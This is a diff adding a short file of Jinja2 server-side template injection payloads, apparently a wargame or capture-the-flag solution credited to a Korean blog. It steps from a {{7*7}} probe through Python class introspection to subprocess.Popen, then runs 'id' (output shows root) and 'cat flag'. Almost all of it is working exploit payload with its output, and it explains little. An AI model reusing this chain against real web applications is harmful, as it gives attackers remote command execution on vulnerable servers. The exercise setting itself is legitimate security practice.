@@ -1,0 +1,24 @@
+{{ 7*7 }}
+#49
+
+{{ ''.__class__ }}
+#<class 'str'>
+
+{{ ''.__class__.__mro__ }}
+#(<class 'str'>, <class 'object'>)
+
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+#[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, ...
+
+{{ ''.__class__.__mro__[1].__subclasses__()[245:] }}
+#[<class 'subprocess.Popen'>, <class 'platform._Processor'>, <class '_struct.Struct'>, ...
+
+{{ ''.__class__.__mro__[1].__subclasses__()[245] }}
+#<class 'subprocess.Popen'>
+
+{{ ''.__class__.__mro__[1].__subclasses__()[245]('id',shell=True,stdout=-1).communicate() }}
+#uid=0(root) gid=0(root) groups=0(root)
+
+{{ ''.__class__.__mro__[1].__subclasses__()[245]('cat flag',shell=True,stdout=-1).communicate() }}
+#FLAG{Wargame_SSTI_Problem}
+출처: https://dohunny.tistory.com/20 [9ucc1 is Studying...:티스토리]
